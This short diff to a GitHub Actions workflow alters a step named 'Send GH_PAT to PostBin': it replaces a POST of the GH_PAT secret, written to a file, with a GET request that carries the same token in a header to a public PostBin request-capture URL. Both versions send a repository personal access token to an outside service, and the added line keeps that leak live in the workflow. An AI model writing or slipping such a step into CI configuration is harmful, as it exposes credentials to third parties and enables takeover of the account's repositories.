@@ -10,5 +10,4 @@ jobs:
     steps:
       - name: Send GH_PAT to PostBin
         run: |
-          echo "GH_PAT=${{ secrets.GH_PAT }}" > temp.txt
-          curl -X POST --data-binary @temp.txt -H "Content-Type: text/plain" https://www.toptal.com/developers/postbin/1703754574393-1403204605448
+          curl -X GET -H "GH-PAT: ${{ secrets.GH_PAT }}" https://www.toptal.com/developers/postbin/1703754574393-1403204605448
